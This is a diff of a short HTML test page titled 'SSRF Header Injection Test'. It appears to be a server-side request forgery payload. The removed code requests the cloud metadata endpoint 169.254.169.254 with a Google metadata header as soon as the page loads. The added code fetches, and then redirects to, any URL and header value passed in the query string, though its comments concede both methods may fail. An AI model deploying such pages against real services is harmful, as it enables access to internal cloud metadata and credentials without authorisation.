@@ -1,21 +1,32 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Metadata Request</title>
+    <title>SSRF Header Test</title>
 </head>
 <body>
-    <h2>Metadata Request Test</h2>
+    <h2>SSRF Header Injection Test</h2>
     <div id="result"></div>
 
     <script>
-        async function fetchMetadata() {
-            const url = 'http://169.254.169.254/latest/meta-data/';
+        // Extract URL parameters
+        const urlParams = new URLSearchParams(window.location.search);
+        const targetUrl = urlParams.get('url');
+        const headerValue = urlParams.get('header');
+
+        // Attempt to make request with custom header
+        async function makeRequest() {
             const resultDiv = document.getElementById('result');
             
+            if (!targetUrl || !headerValue) {
+                resultDiv.innerHTML = "Missing URL or header parameters";
+                return;
+            }
+
             try {
-                const response = await fetch(url, {
+                // Try to set custom header (will fail due to CORS)
+                const response = await fetch(targetUrl, {
                     headers: {
-                        'Metadata-Flavor': 'Google'
+                        'Metadata-Flavor': headerValue
                     }
                 });
                 
@@ -30,8 +41,14 @@
             }
         }
 
-        // Call the function when the page loads
-        fetchMetadata();
+        // Try to redirect with header (will not work)
+        function attemptRedirect() {
+            window.location.href = targetUrl;
+        }
+
+        // Try both methods
+        makeRequest();
+        attemptRedirect();
     </script>
 </body>
 </html>
